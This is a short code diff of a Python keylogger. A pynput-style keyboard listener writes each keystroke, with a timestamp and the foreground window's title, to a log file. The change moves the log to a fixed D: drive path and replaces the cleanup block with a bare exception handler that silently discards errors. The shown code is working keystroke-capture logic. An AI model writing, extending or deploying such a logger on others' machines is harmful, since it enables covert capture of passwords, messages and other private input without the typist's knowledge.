@@ -12,14 +12,14 @@ def on_press(key):
     if k == "pause":
         return False
     else:
-        f = open("keyLog.txt", "a")
+        f = open("D:\Programming\keyLog.txt", "a")
         x = datetime.datetime.now()
         try:
             str = x.strftime("%Y-%m-%d %H:%M:%S") + ":\t " + GetWindowText(GetForegroundWindow()).split(" - ")[len(GetWindowText(GetForegroundWindow()).split(" - ")) - 1]+ ":\t " + k + "\n"
             f.write(str.encode('ascii', 'ignore').decode('ascii'))
-
-        finally:
-            f.close()
+        except:
+            pass
+        f.close()
     
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
